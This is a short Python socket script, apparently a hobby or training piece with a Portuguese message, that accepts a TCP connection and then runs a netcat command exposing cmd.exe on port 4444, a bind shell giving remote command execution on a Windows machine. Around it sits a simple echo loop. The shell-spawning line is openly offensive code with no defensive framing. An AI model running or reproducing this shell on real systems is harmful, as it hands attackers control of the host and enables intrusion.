import socket
import os

HOST = "10.0.0.115"
PORT = 4231

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((HOST, PORT))
    s.listen()

    con, end = s.accept()

    with con:
        print(f"Conectado um dispositivo {end}")
        os.system("nc -nvlp 4444 -e cmd.exe")
        while True:
            data = con.recv(1024)
            if not data:
                break
            con.sendall(data)
